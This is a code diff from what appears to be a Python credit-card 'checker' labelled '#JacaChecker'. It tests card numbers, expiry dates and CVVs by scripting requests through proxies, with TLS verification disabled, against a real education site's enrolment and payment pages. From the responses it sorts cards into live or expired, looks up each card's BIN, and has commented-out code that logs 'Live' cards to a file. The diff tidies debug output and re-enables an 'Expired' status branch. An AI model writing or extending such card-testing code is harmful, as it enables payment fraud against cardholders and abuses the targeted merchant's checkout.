@@ -218,7 +218,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            print(response.text)
+            
                         
             url = f"https://www.eduwhere.com/secure/enroll_username_validate.php?username={username}"
 
@@ -240,7 +240,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-            print(response.text)
+            
 
             url = "https://www.eduwhere.com/secure/enroll_payment.php"
 
@@ -267,7 +267,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            print(response.text) 
+            
                            
             url = "https://www.eduwhere.com/secure/enroll_payment.php"
 
@@ -295,7 +295,6 @@ def Saldo(card, month, year, cvv):
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
             ssl_invoice_number = pegarItem(response.text, "name='ssl_invoice_number' id='ssl_invoice_number' value='","'")
-            print(response.text)
             
             
             url = f"https://www.eduwhere.com/secure/enroll_cc_verify.php?ccnum={card}"
@@ -318,7 +317,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-            print(response.text)
+            
 
 
             year = year[2:]
@@ -347,7 +346,7 @@ def Saldo(card, month, year, cvv):
             }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            print(response.text)
+            
             recap = SaldoTask()
             url = "https://www.eduwhere.com/secure/enroll_payment_confirm.php"
 
@@ -652,13 +651,14 @@ def checker(card, month, year, cvv):
                     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                     # print(Fore.GREEN + f"{x} #JacaChecker") 
                     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
-                # elif 'Expired' in response.text:
-                #     saldousdo = Saldo(card, month, year, cvv)
-                #     # bin = api_bin(card[:6])              
-                #     # x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19"                    
-                #     # #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
-                #     # print(Fore.GREEN + f"{x} #JacaChecker") 
-                #     return {"code": saldousdo["codee"], "mensagem": saldousdo["mensageme"]}
+                    
+                elif 'Expired' in response.text:
+                    #saldousdo = Saldo(card, month, year, cvv)
+                    bin = api_bin(card[:6])              
+                    x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Expired"                    
+                    #pen("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                    print(Fore.GREEN + f"{x} #JacaChecker") 
+                    return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                         
                 elif 'error' in response.text:  
                     msg = pegarItem(response.text, 'reason: ','<')
